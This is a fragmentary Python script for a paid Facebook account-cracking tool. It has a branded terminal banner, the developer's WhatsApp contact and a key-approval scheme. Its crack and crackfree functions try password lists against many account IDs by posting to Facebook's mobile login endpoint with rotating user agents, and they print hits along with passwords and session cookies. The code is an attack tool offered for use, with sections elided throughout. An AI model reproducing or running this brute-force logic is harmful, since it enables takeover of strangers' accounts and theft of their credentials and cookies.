...
\033[1;92m \x1b[38;5;48m /$$__  $$ /$$__  $$|_  $$_/| $$_____/
\033[1;92m \x1b[38;5;49m| $$  \ $$| $$  \__/  | $$  | $$      
\033[1;92m \x1b[38;5;50m.  | $$$$$$$$|  $$$$$$   | $$  | $$$$$   
\033[1;92m \x1b[38;5;50m.  | $$__  $$ \____  $$  | $$  | $$__/   
\033[1;92m \x1b[38;5;50m.  | $$  | $$ /$$  \ $$  | $$  | $$      
\033[1;92m \x1b[38;5;50m.  | $$  | $$|  $$$$$$/ /$$$$$$| $$      
\033[1;92m \x1b[38;5;50m.  |__/  |__/ \______/ |______/|__/          \033[1;37mV\033[1;92m/\033[1;37m7.0  
...
\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;91m[\033[1;37m=\033[1;91m] \033[1;92mDᴇᴠᴇʟᴏᴘᴇʀ \033[1;37m• \033[1;92mASIF SAKHANI\033[1;91m(\033[1;92mOᴡɴᴇʀ-ASIF\033[1;91m)
\033[1;91m[\033[1;37m=\033[1;91m]\033[1;92m Fᴀᴄᴇʙᴏᴏᴋ \033[1;37m • \033[1;92mMR DEVIL 
...
\033[1;91m[\033[1;37m=\033[1;91m]\033[1;92m Whastapp  \033[1;37m• \033[1;91m(\033[1;37m03417020930\033[1;91m)
\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
meyermarexudi =(""" \033[0;97m=============================================""")    
alltimexudi =(""" \033[32;1m[-] ONLY APPROVAL SYSTEM 7 DEYS 250 ToKen 30 500TOKen FOR    APPROVAL""")
  ...
  try:
    ...
    if id in httpCaht:
     ...
     # print(" \033[32;1m[+] Your Kay : "+id)
      print("\033[1;39m[\033[1;32m●\033[1;39m]\033[1;33m A𝚂IF Tᴏᴏʟs Dᴀɪʟʏ Uᴘᴅᴀᴛᴇ)✅ \033[0;92m")
      print("\033[1;39m┏━[\033[1;32m●\033[1;39m] \033[1;32mNote : \033[0;41mByPass: User Be Happy 😊):\033[0;92m")
      ...
      tks = ('Assalamu%20Alaikum🌺%20!%20Please%20Approve%20My%20Key%20Team%20Atc%20Cyber%20:%20'+id);os.system('am start https://wa.me/+923417020930?text='+tks),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
...
def back():
	login()
###os.system('espeak -a 300 " WellCome,Paid,User,ASIF SAKHANI,World"')
def login():
    try:
...
#    print("\033[38;5;21m[\033[38;5;23m1\033[38;5;21m] \033[38;5;190m𝐔𝐒𝐄𝐑 𝐍𝐀𝐌𝐄\033[38;5;125m :\033[38;5;125m "+uname)
 ...
 #   print('\033[0;97m===============================================')
    ...
    print("        \033[0;47m\033[1;91mASIF\033[0;92m""")
    print("\033[1;97m    ASIF SAKHANI              """)
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[ASIF SAKHANI]-{P}[{H}{loop}{P}]-[{H}{len(id)}{P}]-[{H}OK{bo}-{H}{ok}{P}]-[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[1;92m\033[1;92m[\033[1;91mASIF-Cᴘ🖤\033[1;92m] \033[1;92m\033[1;92m[\033[1;92mNUM\033[1;37m]> {idf} \033[1;92m\033[1;92m[\033[1;92mPASS\033[1;92m]> \033[1;37m{pw}')
                ...
                print(f'\r\r\x1b[38;5;50m\x1b[38;5;50m[\x1b[38;5;50mASIF-Oᴋ-💙\x1b[38;5;50m] \x1b[38;5;50m\x1b[38;5;50m[\x1b[38;5;50mFᴀᴄᴇʙᴏᴏᴋ\x1b[38;5;50m]= \033[1;93m{idf} \x1b[38;5;50m\x1b[38;5;50m[\x1b[38;5;50mPᴀssᴡᴏʀᴅ\x1b[38;5;50m]= \033[1;93m{pw}\n\x1b[38;5;50mCᴏᴏᴋᴇs \x1b[38;5;50m[🌸]\x1b[38;5;50m=\x1b[38;5;50m= \033[1;37m{kuki} ')
...
def crackfree(idf,pwv):
    global loop,ok,CP
    sys.stdout.write(f"\r{H}[ASIF SAKHANI]{P}-[{H}{loop}{P}]{P}-[{H}{len(id)}{P}]-[OK{P}-{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mASIF-Cᴘ🖤\033[1;91m] {idf} • {pw}')
